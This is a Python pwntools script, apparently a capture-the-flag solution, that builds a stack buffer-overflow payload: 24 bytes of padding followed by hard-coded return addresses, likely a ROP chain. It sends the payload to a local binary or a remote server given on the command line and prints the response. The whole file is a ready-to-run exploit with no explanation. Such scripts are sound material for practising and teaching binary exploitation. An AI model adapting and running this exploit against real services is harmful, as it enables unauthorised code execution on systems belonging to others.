#!/usr/bin/python3
import pwn
import sys

if __name__ == '__main__':
    localMode = len(sys.argv) != 3
    attack = b"012345678901234567890123"
    attack += b"\x11\x1a\x40\x00\x00\x00\x00\x00"
    attack += b"\x00\x00\x00\x00\x00\x00\x00\x00"
    attack += b"\xf5\x17\x40\x00\x00\x00\x00\x00"
    print(attack, f"len: {len(attack)}")
    target = None

    if localMode:
        target = pwn.process(sys.argv[1])  # Use local file
    else:
        server = sys.argv[1]
        port = int(sys.argv[2])
        target = pwn.remote(server, port)  # Connect to the server

    target.sendlineafter(b'?', attack)
    print(target.recvall().decode("utf-8", "ignore").strip())